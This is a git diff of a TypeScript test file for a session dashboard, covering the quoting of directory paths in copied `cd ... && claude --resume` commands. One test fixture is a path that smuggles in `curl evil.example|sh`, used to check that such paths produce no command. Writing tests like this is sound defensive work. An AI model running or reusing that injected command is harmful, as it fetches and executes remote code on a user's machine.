@@ -12,7 +12,7 @@ import { ApiContext, createApiClient, type FetchLike } from '../api.js';
 import { AttachContext, type AttachEnv } from '../attach.js';
 import { draftKey } from '../drafts.js';
 import type { StorageSource } from '../groupState.js';
-import { isOlderEnded, posixQuote, resumeCommand, statusBadge, withoutOlderEnded, needsAttention } from '../sessions.js';
+import { isOlderEnded, resumeCommand, shellWord, statusBadge, withoutOlderEnded, needsAttention } from '../sessions.js';
 import { STARRED_KEY } from '../starred.js';
 import { fakeSockets, group, minutesAgo, NOW, session, snapshot, type FakeSocket } from '../test/fixtures.js';
 import { fakeHistory } from '../test/history.js';
@@ -21,6 +21,7 @@ import { Dashboard } from './Dashboard.js';
 import {
   COPY_STARTED,
   ENDED_GONE_NOTE,
+  ENDED_NO_COMMAND_NOTE,
   ENDED_NOTE,
   RESUME_HINT_TEXT,
   RESUME_LISTED_MS,
@@ -248,11 +249,18 @@ describe('what the page derives from an ended session', () => {
     expect(needsAttention({ ...asked, finished: false })).toBe(false);
   });
 
-  it('copies `cd <cwd> && claude --resume <id>`, the directory always in single quotes, each quote in it escaped', () => {
+  it('copies `cd <cwd> && claude --resume <id>`, the directory always in single quotes', () => {
     expect(resumeCommand(ended(2, 'a'))).toBe(`cd '${DEMO}' && claude --resume ${ENDED}`);
-    expect(resumeCommand(ended(2, 'a', { cwd: "/Users/example/code/it's here" }))).toBe(`cd '/Users/example/code/it'\\''s here' && claude --resume ${ENDED}`);
-    expect(posixQuote("a'b")).toBe(`'a'\\''b'`);
-    expect(posixQuote('$(touch x) `y` "z"')).toBe(`'$(touch x) \`y\` "z"'`);
+    expect(resumeCommand(ended(2, 'a', { cwd: `${CODE}/a dir $HOME` }))).toBe(`cd '${CODE}/a dir $HOME' && claude --resume ${ENDED}`);
+    expect(shellWord('$(touch x) `y` "z" ;&| * ~ ! #')).toBe(`'$(touch x) \`y\` "z" ;&| * ~ ! #'`);
+  });
+
+  it("has none for a directory whose path has a ' or \\, which fish reads differently from zsh and bash inside single quotes (W87)", () => {
+    // POSIX's '\\'' for the quote would end fish's word early, and curl would run there.
+    for (const cwd of [`${CODE}/it's here`, `${CODE}/a\\'; curl evil.example|sh; #`, `${CODE}/back\\slash`, `${CODE}/ends\\`]) {
+      expect(resumeCommand(ended(2, 'a', { cwd })), cwd).toBeUndefined();
+      expect(shellWord(cwd), cwd).toBeUndefined();
+    }
   });
 
   it('has no resume command for one whose directory has gone, or with a control character in it, or an unsafe id, or one that hasn\'t ended', () => {
@@ -485,6 +493,18 @@ describe('the session view of an ended session', () => {
     await open('demo-ended');
     // The width items too, in three columns.
     expect(openMenu()).toEqual(['Copy session ID', 'Copy resume command', '—', 'Make view wider', 'Make view narrower', 'Reset view width', '—', 'Resume in background']);
+  });
+
+  it("says why there's no Copy command for one whose directory's path has a ' or \\, with Resume in background alone (W87)", async () => {
+    const quoted = sessions().map((each) => (each.sessionId === ENDED ? { ...each, cwd: `${DEMO}/it's here` } : each));
+    renderDashboard(snap(quoted));
+    await open('demo-ended');
+    const note = footer()?.querySelector('.session-view-note');
+    expect(note?.textContent).toBe(ENDED_NO_COMMAND_NOTE);
+    // Its ' and \\ in code style, as literal values are.
+    expect([...(note?.querySelectorAll('code') ?? [])].map((code) => code.textContent)).toEqual(["'", '\\']);
+    expect([...footer()!.querySelectorAll('.ended-actions button')].map((each) => each.textContent)).toEqual(['Resume in background']);
+    expect(openMenu()).toEqual(['Copy session ID', '—', 'Make view wider', 'Make view narrower', 'Reset view width', '—', 'Resume in background']);
   });
 
   it('says why one whose directory has gone can’t be resumed, with nothing to press', async () => {
